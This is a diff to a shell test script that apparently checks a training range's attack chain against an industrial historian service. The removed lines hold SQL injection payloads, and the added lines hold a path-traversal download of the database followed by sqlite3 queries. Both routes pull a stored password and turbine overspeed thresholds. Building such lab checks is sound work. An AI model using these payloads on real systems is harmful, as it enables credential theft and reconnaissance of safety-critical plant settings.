@@ -59,20 +59,27 @@ else
     fail "downloaded DB is suspiciously small (${SIZE:-?} bytes)"
 fi
 
-echo "[hist-trav] Stage 3: alarm_config and config rows recoverable via SQLi"
+echo "[hist-trav] Stage 3: sqlite3 against downloaded DB (mirrors runbook)"
 
-# The runbook also runs sqlite3 on the downloaded file. We do not have
-# sqlite3 on bursar-desk by default, so use the SQLi route (ent-to-trip
-# already tests this in detail; here we confirm the same recon path is
-# available from a path-traversal-only attack chain).
-ALARM_SQLI_URL="http://10.10.2.10:8080/report?asset=x'+UNION+SELECT+tag,hi_hi,unit+FROM+alarm_config--&from=0&to=9"
-ALARM_OUT="$(in_container "$ENT_WS" curl -sf -m 5 "$ALARM_SQLI_URL" 2>&1)"
-assert_contains "$ALARM_OUT" "turbine_rpm.*3300" \
-    "alarm_config exfiltrates overspeed threshold via SQLi"
-
-CONFIG_SQLI_URL="http://10.10.2.10:8080/report?asset=x'+UNION+SELECT+key,value,'x'+FROM+config--&from=0&to=9"
-CONFIG_OUT="$(in_container "$ENT_WS" curl -sf -m 5 "$CONFIG_SQLI_URL" 2>&1)"
-assert_contains "$CONFIG_OUT" "Historian2015" \
-    "config table exfiltrates stored password via SQLi"
+# The runbook says: after downloading, run sqlite3 queries against the file.
+# bursar-desk has sqlite3 installed (added during the audit pass), so we can
+# exercise the runbook's exact .tables / SELECT commands instead of routing
+# the same data discovery through SQLi.
+SQL_OUT="$(in_container "$ENT_WS" sh -c '
+curl -sf -m 5 "http://10.10.2.10:8080/export?tag=../historian.db" -o /tmp/h.db
+echo "==== .tables ===="
+sqlite3 /tmp/h.db ".tables"
+echo "==== alarm_config ===="
+sqlite3 /tmp/h.db "SELECT tag, hi_hi, unit FROM alarm_config;"
+echo "==== config ===="
+sqlite3 /tmp/h.db "SELECT key, value FROM config;"
+rm -f /tmp/h.db
+')"
+assert_contains "$SQL_OUT" "alarm_config" "sqlite3 .tables lists alarm_config"
+assert_contains "$SQL_OUT" "config"       "sqlite3 .tables lists config"
+assert_contains "$SQL_OUT" "turbine_rpm.*3300" \
+    "sqlite3 SELECT FROM alarm_config returns overspeed threshold (3300 RPM)"
+assert_contains "$SQL_OUT" "Historian2015" \
+    "sqlite3 SELECT FROM config returns stored password"
 
 summary
